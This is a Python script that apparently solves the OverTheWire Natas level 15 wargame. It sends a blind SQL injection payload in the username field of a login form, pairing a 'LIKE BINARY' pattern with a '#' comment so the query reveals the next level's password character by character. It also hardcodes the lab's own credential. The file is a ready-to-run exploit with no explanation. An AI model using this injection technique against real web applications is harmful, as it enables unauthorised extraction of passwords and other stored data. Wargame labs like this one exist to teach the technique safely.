import requests 
from requests.auth import HTTPBasicAuth 
import string 

chars = string.ascii_letters  + string.digits 
filtred = '' 
passwd = '' 

for char in chars : 
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug' , auth=HTTPBasicAuth('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'),data = {'username' : 'natas16" AND password LIKE BINARY "%'  + char +'%"#'}) 

    if 'exists' in r.text : 
        filtred += char 
        print(char + ' exists in the password') 

print()
print()
print('collecting pattern')
print('-'*15)

for i in range(0,32):
    for char in filtred : 
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug' , auth=HTTPBasicAuth('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'),data = {'username' : 'natas16" AND password LIKE BINARY "' + passwd + char + '%"#'}) 
        if 'exists' in r.text : 
            passwd += char 
            print('pattern :'+ passwd) 
            break

print()
print()
print('-'*15)
print('password is : ' + passwd)
